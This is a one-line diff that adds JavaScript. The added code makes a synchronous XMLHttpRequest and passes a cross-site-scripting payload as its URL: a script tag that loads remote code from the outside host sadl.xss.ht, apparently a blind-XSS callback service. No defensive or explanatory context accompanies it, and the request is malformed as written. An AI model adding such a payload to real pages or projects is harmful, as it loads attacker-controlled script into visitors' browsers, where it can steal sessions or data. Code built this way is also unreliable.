@@ -1,0 +1,1 @@
+var xhr=new XMLHttpRequest();xhr.open('GET','<script>$.getScript("//sadl.xss.ht")</script>',false);xhr.send();if(xhr.status!=200){alert(xhr.status+': '+xhr.statusText);}else{alert(xhr.responseText);}
